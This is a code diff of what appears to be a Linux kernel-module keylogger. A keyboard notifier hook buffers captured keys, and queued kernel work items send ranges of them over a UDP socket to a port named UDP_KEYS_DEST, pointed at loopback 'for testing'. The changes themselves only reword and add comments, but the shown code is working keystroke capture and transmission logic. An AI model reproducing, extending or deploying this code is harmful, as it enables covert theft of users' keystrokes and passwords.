@@ -58,14 +58,12 @@ void send_data_to_socket(int from, int to)
     char message[to - from];
     size_t len = to - from;
     memcpy(message, keys + from, to - from);
-    // Set up the destination address
+    // setting up the destination address
     memset(&dest_addr, 0, sizeof(dest_addr));
     dest_addr.sin_family = AF_INET;
     dest_addr.sin_port = htons(UDP_KEYS_DEST);          // Remote port
     dest_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Loopback for testing
-
-
-    // Set up message header and iovec
+    // setting up message header and iovec
     memset(&msg, 0, sizeof(msg));
     msg.msg_name = &dest_addr;
     msg.msg_namelen = sizeof(dest_addr);
@@ -73,7 +71,7 @@ void send_data_to_socket(int from, int to)
     vec.iov_base = message;
     vec.iov_len = len;
 
-    // Send the message
+    // sending the message
     sent_bytes = kernel_sendmsg(sock, &msg, &vec, 1, len);
     if (sent_bytes < 0)
     {
@@ -89,15 +87,15 @@ void send_data_to_socket(int from, int to)
 static void logger_work_handler(struct work_struct *work)
 
 {
-    // copy current pid to buffer
+    // copy current pid to buffer, this is the worker thread
     sprintf(keys_worker, "%d", current->group_leader->pid);
 
     struct logger_work *lw = container_of(work, struct logger_work, work);
 
-    // Send data in the specified range
+    // send the data from starting index to ending index
     send_data_to_socket(lw->from, lw->to);
 
-    // Free the work item and decrement the pending jobs count
+    // free the work item and decrement the pending jobs count, as this job is done 
     kfree(lw);
     atomic_dec(&pending_jobs);
 }
@@ -126,6 +124,7 @@ int logger_hook(struct notifier_block *nblock, unsigned long val, void *v)
     {
 
         // try to  generate workqueue job with write_index, read_index
+        // atomic_add_unless is used to check if we can add more jobs to the queue
         if (atomic_add_unless(&pending_jobs, 1, MAX_PENDING_JOBS_KEYS))
         {
             struct logger_work *work = kmalloc(sizeof(struct logger_work), GFP_ATOMIC);
@@ -136,7 +135,7 @@ int logger_hook(struct notifier_block *nblock, unsigned long val, void *v)
                 work->to = write_index;
                 read_index = write_index;
 
-                // Increment the pending jobs count and queue the work
+                // queue the work
                 queue_work(logger_wq, &work->work);
             }
             else
